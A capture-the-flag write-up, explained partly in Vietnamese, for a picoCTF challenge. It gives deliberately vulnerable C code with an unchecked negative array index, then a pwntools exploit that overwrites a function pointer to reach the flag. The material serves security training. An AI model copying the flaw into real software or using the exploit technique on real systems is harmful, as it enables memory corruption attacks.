# function overwrite

## source code

```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <wchar.h>
#include <locale.h>

#define BUFSIZE 64
#define FLAGSIZE 64

int calculate_story_score(char *story, size_t len)
{
  int score = 0;
  for (size_t i = 0; i < len; i++)
  {
    score += story[i];
  }

  return score;
}

void easy_checker(char *story, size_t len)
{
  if (calculate_story_score(story, len) == 1337)
  {
    char buf[FLAGSIZE] = {0};
    FILE *f = fopen("flag.txt", "r");
    if (f == NULL)
    {
      printf("%s %s", "Please create 'flag.txt' in this directory with your",
                      "own debugging flag.\n");
      exit(0);
    }

    fgets(buf, FLAGSIZE, f); // size bound read
    printf("You're 1337. Here's the flag.\n");
    printf("%s\n", buf);
  }
  else
  {
    printf("You've failed this class.");
  }
}

void hard_checker(char *story, size_t len)
{
  if (calculate_story_score(story, len) == 13371337)
  {
    char buf[FLAGSIZE] = {0};
    FILE *f = fopen("flag.txt", "r");
    if (f == NULL)
    {
      printf("%s %s", "Please create 'flag.txt' in this directory with your",
                      "own debugging flag.\n");
      exit(0);
    }

    fgets(buf, FLAGSIZE, f); // size bound read
    printf("You're 13371337. Here's the flag.\n");
    printf("%s\n", buf);
  }
  else
  {
    printf("You've failed this class.");
  }
}

void (*check)(char*, size_t) = hard_checker;
int fun[10] = {0};

void vuln()
{
  char story[128];
  int num1, num2;

  printf("Tell me a story and then I'll tell you if you're a 1337 >> ");
  scanf("%127s", story);
  printf("On a totally unrelated note, give me two numbers. Keep the first one less than 10.\n");
  scanf("%d %d", &num1, &num2);

  if (num1 < 10)
  {
    fun[num1] += num2;
  }

  check(story, strlen(story));
}
 
int main(int argc, char **argv)
{

  setvbuf(stdout, NULL, _IONBF, 0);

  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  vuln();
  return 0;
}
```

## checksec

```terminal
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

## solution

Trong hàm vuln, num1 tuy có được kiểm tra điều kiện `< 10` nhưng như vậy là chưa đủ. Vì vậy, ta có thể gán giá trị âm cho num1. Khi đó mảng `fun[]` được lưu trong `.bss` section có địa chỉ cao hơn con trỏ `*check` được lưu trong .data section. Bằng cách sử dụng index âm ta có thể cho `fun[num1]` trỏ đến `*check`, sau đó ghi đề giá trị của `easycheck` vào `fun[num1]`.

![check](check.png)

![fun](fun.png)

Từ địa chỉ của `check` và `fun` ta tính được `num1 = (check -fun)/4 = -16`.

![hard](hard.png)

![easy](easy.png)

Từ `hard` và `easy` ta tính được `num2 = hard-easy = -314`.

```python
from pwn import *

context.binary = exe = ELF('./vuln')
context.log_level = 'debug'

# p = process('./vuln')
p = connect('saturn.picoctf.net', 52190)

payload = b'B'*20 + b'\x11'
p.sendlineafter(b'a 1337 >> ', payload)

payload = b"-16 -314"
p.sendlineafter(b'less than 10.\n', payload)

p.interactive()
```